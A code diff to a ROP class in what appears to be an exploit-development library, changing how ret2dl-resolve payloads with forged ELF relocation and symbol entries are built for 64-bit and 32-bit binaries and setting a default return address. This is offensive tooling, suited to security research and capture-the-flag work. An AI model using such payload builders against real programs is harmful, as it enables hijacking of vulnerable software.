@@ -586,6 +586,7 @@ class ROP(ELF):
             addr_reloc, pad_reloc = align(base + self.wordsize*3, jmprel, relaent)
             addr_sym, pad_sym = align(addr_reloc + 0x18, symtab, syment)
             addr_symstr = addr_sym + syment
+            addr_end = addr_symstr + len(name) + 1
 
             reloc_offset = (addr_reloc - jmprel) / relaent
             r_info = (((addr_sym - symtab) / syment) << 32) | 0x7
@@ -593,10 +594,7 @@ class ROP(ELF):
 
             buf = self.p(self.plt())
             buf += self.p(reloc_offset)
-            if 'retaddr' in kwargs:
-                buf += self.p(kwargs['retaddr'])
-            else:
-                buf += self.junk()
+            buf += self.p(kwargs.get('retaddr', addr_end))
             buf += self.fill(pad_reloc)
             buf += struct.pack('<QQQ', self.section('.bss'), r_info, 0)  # Elf64_Rela
             buf += self.fill(pad_sym)
@@ -612,6 +610,7 @@ class ROP(ELF):
             addr_reloc = base + self.wordsize*(3+len(args))
             addr_sym, pad_sym = align(addr_reloc+relent, symtab, syment)
             addr_symstr = addr_sym + syment
+            addr_end = addr_symstr + len(name) + 1
 
             reloc_offset = addr_reloc - jmprel
             r_info = (((addr_sym - symtab) / syment) << 8) | 0x7
@@ -619,10 +618,7 @@ class ROP(ELF):
 
             buf = self.p(self.plt())
             buf += self.p(reloc_offset)
-            if 'retaddr' in kwargs:
-                buf += self.p(kwargs['retaddr'])
-            else:
-                buf += self.junk()
+            buf += self.p(kwargs.get('retaddr', addr_end))
             for arg in args:
                 buf += self.p(arg)
             buf += struct.pack('<II', self.section('.bss'), r_info)  # Elf32_Rel
